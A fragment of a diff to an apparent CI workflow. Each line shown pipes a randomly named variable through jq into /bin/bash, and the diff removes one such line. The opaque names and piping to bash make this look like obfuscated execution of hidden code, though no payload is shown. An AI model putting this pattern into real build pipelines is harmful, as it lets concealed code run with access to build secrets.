@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$uecu119" | jq -r .tde128 | /bin/bash
           echo $tv43675 | jq -r .evoud73 | /bin/bash
           printf '%s' "$c95" | jq -r .gyapz15048 | /bin/bash
-          printf '%s' "$d45" | jq -r .ms0812 | /bin/bash
           echo $jylrb71 | jq -r .tswjr4212 | /bin/bash
           echo $bklz57 | jq -r .smde56271 | /bin/bash
           echo $yjdo45 | jq -r .vuf79 | /bin/bash
